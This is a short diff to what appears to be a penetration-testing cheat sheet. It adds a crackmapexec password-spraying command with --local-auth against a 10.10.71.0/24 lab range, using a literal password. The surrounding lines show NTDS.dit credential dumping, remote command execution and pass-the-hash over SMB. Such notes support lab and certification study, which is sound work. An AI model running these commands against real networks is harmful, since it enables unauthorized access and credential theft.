@@ -2121,6 +2121,9 @@ crackmapexec smb <Rhost/range> -u 'user' -p 'password' --ntds #dumps NTDS.dit fi
 crackmapexec smb <Rhost/range> -u 'user' -p 'password' --groups {groupname} #we can also run with a specific group and enumerated users of that group.
 crackmapexec smb <Rhost/range> -u 'user' -p 'password' -x 'command' #For executing commands, "-x" for cmd and "-X" for powershell command
 
+#IF NONE OF THE ABOVE WORK, TRY THE --local-auth flag
+crackmapexec smb 10.10.71.0/24 -u users.txt -p hghgib6vHT3bVWf --local-auth
+
 #Pass the hash
 crackmapexec smb <ip or range> -u username -H <full hash> --local-auth
 #We can run all the above commands with hash and obtain more information
